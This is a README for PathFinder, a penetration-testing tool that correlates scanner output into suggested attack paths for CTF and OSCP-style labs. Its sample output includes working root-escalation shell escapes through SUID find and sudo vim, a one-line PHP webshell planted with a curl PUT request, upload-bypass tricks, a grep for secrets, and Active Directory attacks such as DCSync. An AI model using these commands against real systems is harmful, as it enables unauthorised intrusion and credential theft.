# PathFinder

**Intelligent Reconnaissance Analysis and Attack Path Suggestion for Pentesters.**

## Overview

PathFinder is a command-line tool designed to act as an intelligent assistant during the reconnaissance and exploitation phases of penetration testing. It helps answer the critical question: **"What am I missing here...?"**

Instead of manually correlating findings from various scanning tools (like Nmap, Gobuster, LinPEAS), PathFinder parses their output, applies a ruleset based on common offensive security patterns and known vulnerabilities, and synthesises potential attack paths. It prioritises findings based on exploitability and impact, helping testers focus their efforts - especially in time-constrained scenarios like CTFs or OSCP-style exams.

## The Problem

Manual analysis of scan data is time-consuming and prone to human error. Key connections between disparate findings might be missed:
- A specific service version vulnerable to a known exploit
- Default credentials working on an overlooked service
- A file upload capability + writable web root = webshell opportunity
- An AS-REP roastable user discovered via SharpHound, with a hash captured by GetNPUsers
- SUID binaries or sudo misconfigurations surfaced by LinPEAS

## The Solution

PathFinder aims to:
- **Automate Analysis:** Ingest data from common recon tools
- **Correlate Findings:** Link service versions, open ports, discovered paths, credentials, and privilege escalation vectors
- **Suggest Attack Paths:** Move beyond simple vulnerability listing to suggest multi-step attack chains based on combined evidence
- **Prioritise:** Use a heuristic scoring system to highlight the most promising leads
- **Provide Context:** Explain *why* a suggestion is being made, with suggested commands and HackTricks references
- **Integrate:** Suggest relevant Metasploit modules, `searchsploit` queries, and public GitHub exploits

## Key Features

- **Auto-Detect Scan Mode:** Drop all tool outputs into a folder and run `pathfinder scan ./loot/`. PathFinder identifies file types by content and runs the right parser automatically - no need to remember the flag names under exam pressure.
- **Multi-Input Parsing:** Ingests and normalises data from Nmap, Gobuster, ffuf, Nikto, WhatWeb, nuclei, wpscan, enum4linux-ng, smbmap, NetExec/CrackMapExec, SNMP, SQLMap, LinPEAS, WinPEAS, SharpHound, ldapdomaindump, Kerbrute, impacket-GetNPUsers, impacket-GetUserSPNs, impacket-secretsdump, and certipy.
- **Vulnerability & Exploit Mapping:** Correlates identified services and versions with known CVEs and public exploits via Exploit-DB (`searchsploit`) and GitHub.
- **Attack Path Synthesis:** A 58-rule engine covering initial foothold, credential reuse and pass-the-hash, web attacks, Linux/Windows privilege escalation, and Active Directory attack paths (Kerberoasting, AS-REP roasting, DCSync, ACL abuse, delegation attacks, AD CS/ESC, and more).
- **Iterative Workflow:** Save findings to JSON after initial recon, reload and append later stages (post-exploitation, AD enumeration) without re-running parsers.
- **Interactive Credential Management:** Add found credentials with `--add-cred`. They are automatically weaponised against all discovered login services by the synthesiser.
- **User-Trainable Intelligence:** Teach PathFinder new attack patterns with `--learn`.
- **Tool Output Compatibility:** Handles multiple output format variants, ANSI colour codes, timestamped entries, and version differences across all supported tools. Colour output is TTY-aware (auto-disabled when piped) and can be forced off with `--no-color`.
- **Single-Target Focus:** Scan mode infers one target host per loot directory - matching the typical OSCP/CTF single-box workflow. For multi-host engagements, run PathFinder once per host's loot directory.

---

## Example Workflow

### Scan Mode (Quick Start)

```bash
# Save all tool outputs to a loot directory as you enumerate
nmap -sV -sC -A -oX loot/nmap.xml 192.168.56.10
gobuster dir -u http://192.168.56.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o loot/gobuster.txt
nikto -h http://192.168.56.10 -o loot/nikto.json -Format json
./linpeas.sh | tee loot/linpeas.txt    # on the target, transfer back

# Point PathFinder at the loot directory - target IP inferred from nmap
python3 -m main.pathfinder scan loot/ -o findings.json -v
```

**Output:**

```
__________         __  .__    ___________.__            .___
\______   \_____ _/  |_|  |__ \_   _____/|__| ____    __| _/___________
 |     ___/\__  \\   __\  |  \ |    __)  |  |/    \  / __ |/ __ \_  __ \
 |    |     / __ \|  | |   Y  \|     \   |  |   |  \/ /_/ \  ___/|  | \/
 |____|    (____  /__| |___|  /\___  /   |__|___|  /\____ |\___  >__|
                \/          \/     \/            \/      \/    \/

  >> [Intelligent Reconnaissance Analysis for Pentesters] <<
           >> [By tpazz - Green Lemon Company] <<

[*] Scanning loot directory: /home/kali/labs/pg-practice/loot

[*] Detected 4 parseable source(s):
    [+] nmap_xml                  -> nmap.xml
    [+] gobuster_txt              -> gobuster.txt
    [+] nikto_json                -> nikto.json
    [+] linpeas_txt               -> linpeas.txt

[*] Target host inferred from Nmap XML: 192.168.56.10

[*] Parsing detected files...

    [+] nmap_xml                  -> 6 findings  (nmap.xml)
    [+] gobuster_txt              -> 9 findings  (gobuster.txt)
    [+] nikto_json                -> 4 findings  (nikto.json)
    [+] linpeas_txt               -> 7 findings  (linpeas.txt)

[*] Running Vulnerability Mapper...

    [+] Mapper prioritized 34 findings.

[*] Saving prioritized findings to: findings.json
    [+] Successfully saved 34 findings.

[*] Running Attack Path Synthesizer...

--- Pathfinder has identified 6 potential attack path(s)! ---

================================================================================
ATTACK PATH #1
Name:       Linux SUID Binary - Privilege Escalation  [Priority: 95]
Target:     192.168.56.10
================================================================================

  [+] Description:
      A SUID binary was found on 192.168.56.10: /usr/bin/find (suid binary, owner: root).
      This binary may be abusable to escalate privileges to root.

  [+] Suggested Commands:
      - Check GTFOBins for exploitation technique: https://gtfobins.github.io/
      - find . -exec /bin/sh -p \; -quit
      - find / -name . -exec /bin/sh -p \; -quit

  [+] References:
      - https://gtfobins.github.io/gtfobins/find/
      - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid-sgid

================================================================================
ATTACK PATH #2
Name:       Sudo Misconfiguration - Abusable Command  [Priority: 92]
Target:     192.168.56.10
================================================================================

  [+] Description:
      sudo -l reveals an abusable command on 192.168.56.10:
      (ALL) NOPASSWD: /usr/bin/vim
      This may allow privilege escalation without knowing the root password.

  [+] Suggested Commands:
      - sudo /usr/bin/vim -c ':!/bin/bash'
      - sudo /usr/bin/vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
      - Check GTFOBins: https://gtfobins.github.io/gtfobins/vim/#sudo

  [+] References:
      - https://gtfobins.github.io/gtfobins/vim/#sudo
      - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo

================================================================================
ATTACK PATH #3
Name:       Backup / Archive File Found  [Priority: 85]
Target:     192.168.56.10
================================================================================

  [+] Description:
      A backup or archive file was discovered at http://192.168.56.10:80/backup.zip.
      These often contain source code, configuration files, or credentials.

  [+] Suggested Commands:
      - wget http://192.168.56.10:80/backup.zip
      - unzip backup.zip -d backup_extracted/
      - grep -rEi 'password|passwd|secret|db_pass|api_key' backup_extracted/

  [+] References:
      - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html#backup-files

================================================================================
ATTACK PATH #4
Name:       File Upload Endpoint - Potential Webshell  [Priority: 82]
Target:     192.168.56.10
================================================================================

  [+] Description:
      A file upload endpoint was discovered at http://192.168.56.10:80/uploads.
      If validation is weak, uploading a PHP webshell may grant remote code execution.

  [+] Suggested Commands:
      - curl -F "file=@shell.php" http://192.168.56.10:80/uploads
      - Upload shell.php then browse to: http://192.168.56.10/uploads/shell.php?cmd=id
      - Try extension bypasses: .php5, .phtml, .php.jpg, .pHp

  [+] References:
      - https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html

================================================================================
ATTACK PATH #5
Name:       Nikto - Dangerous HTTP Methods Enabled  [Priority: 75]
Target:     192.168.56.10
================================================================================

  [+] Description:
      Nikto identified that dangerous HTTP methods (PUT, DELETE) are enabled on
      192.168.56.10. PUT may allow direct file upload to the web root.

  [+] Suggested Commands:
      - curl -X PUT http://192.168.56.10/shell.php -d '<?php system($_GET["cmd"]); ?>'
      - curl -X OPTIONS http://192.168.56.10/ -v

  [+] References:
      - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html#http-methods

================================================================================
ATTACK PATH #6
Name:       Directory Listing / Indexing Enabled  [Priority: 60]
Target:     192.168.56.10
================================================================================

  [+] Description:
      Directory indexing is enabled at http://192.168.56.10:80/. Browsing exposed
      directories may reveal source files, credentials, or sensitive data.

  [+] Suggested Commands:
      - Browse to http://192.168.56.10/ and enumerate directories manually
      - wget -r --no-parent http://192.168.56.10/exposed-dir/

  [+] References:
      - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html#directory-listing

================================================================================

--- Total Findings: 20 (Public Exploits limited to --max-vulns, total discovered: 12):

[1] [Score: 95] suid_binary_found (privilege_escalation)
    Host: 192.168.56.10, Port: None

[2] [Score: 92] sudo_misconfiguration (privilege_escalation)
    Host: 192.168.56.10, Port: None

[3] [Score: 85] /backup.zip (web_content)
    Host: 192.168.56.10, Port: 80

[4] [Score: 82] /uploads (web_content)
    Host: 192.168.56.10, Port: 80

[5] [Score: 80] EDB-ID #50383 - Apache HTTP Server 2.4.49 - Path Traversal and RCE (vulnerability)
    Host: 192.168.56.10, Port: 80

[6] [Score: 75] dangerous_http_methods_enabled (misconfiguration)
    Host: 192.168.56.10, Port: 80

[7] [Score: 70] /admin (web_content)
    Host: 192.168.56.10, Port: 80

[8] [Score: 60] directory_indexing_enabled (misconfiguration)
    Host: 192.168.56.10, Port: 80

[9] [Score: 40] Apache httpd 2.4.49 (software_product)
    Host: 192.168.56.10, Port: 80

[10] [Score: 40] OpenSSH 7.6p1 Ubuntu (software_product)
    Host: 192.168.56.10, Port: 22

[11] [Score: 10] http (service)
    Host: 192.168.56.10, Port: 80

[12] [Score: 10] ssh (service)
    Host: 192.168.56.10, Port: 22
```

---

### Iterative Workflow - Adding Post-Exploitation Data

```bash
# You got a shell and ran WinPEAS. Add it to existing findings.
python3 -m main.pathfinder -i findings.json \
  --winpeas-txt winpeas.txt --target-host 192.168.56.10 \
  -o findings.json

# PathFinder will now surface Windows-specific attack paths:
# -> SeImpersonatePrivilege - Potato Attack to SYSTEM   [Priority: 97]
# -> AlwaysInstallElevated - MSI Shell as SYSTEM        [Priority: 93]
# -> Unquoted Service Path - Binary Hijacking           [Priority: 88]
```

### Active Directory Scenario

```bash
# After domain enumeration
python3 -m main.pathfinder scan loot/ --target-host corp.local

# Example attack paths synthesised:
# -> Kerberoasting - Request and Crack Service Ticket   [Priority: 90]
# -> AS-REP Roasting - Crack Captured Hash              [Priority: 88]
# -> DCSync Rights Found - Dump Domain Hashes           [Priority: 99]
# -> Unconstrained Delegation - Coerce and Capture TGT  [Priority: 92]
# -> Password Spray with Discovered Users               [Priority: 75]
```

---

## Installation

```bash
git clone https://github.com/tpazz/PathFinder.git
cd PathFinder
pip install -r requirements.txt
```

**Optional enrichment dependencies:**
- `searchsploit` (part of `exploitdb`) - for offline CVE/exploit lookups
- GitHub Personal Access Token - set `GITHUB_TOKEN` env variable for higher API rate limits

**Local runtime files:**
- `main/credentials.json` is created locally when you use `--add-cred`.
- `main/github_cache.json` is created locally when GitHub exploit enrichment runs.
- Both files are intentionally gitignored and should not be committed.

---

## Supported Tools

| Category | Tool | Output Format |
|---|---|---|
| Network Scanning | Nmap | XML (`-oX`) |
| Web Enumeration | Gobuster | Text (`-o`) |
| Web Scanning | Nikto | JSON (`-Format json`) |
| Web Fingerprinting | WhatWeb | JSON (`--log-json`) |
| SMB Enumeration | enum4linux-ng | JSON (`-oJ`) |
| SNMP Enumeration | snmp-check | Text (`>` redirect) |
| SQL Injection | SQLMap | Log file (`output/host/log`) |
| Linux PrivEsc | LinPEAS | Text (`tee` or `>`) |
| Windows PrivEsc | WinPEAS | Text (`>` or `Out-File`) |
| AD Enumeration | SharpHound | Directory of JSON files |
| AD Enumeration | ldapdomaindump | Directory of TSV files |
| AD User Enum | Kerbrute | Text (`-o`) |
| AD Hash Capture | impacket-GetNPUsers | Text (`-outputfile`) |

---

## Ethical Disclaimer

This tool is intended for educational purposes and authorised security testing only. Using this tool to attempt unauthorised access to any system is illegal and unethical. Always obtain explicit written permission before using this tool on any system you do not own. The developers assume no liability and are not responsible for any misuse or damage caused by this program.


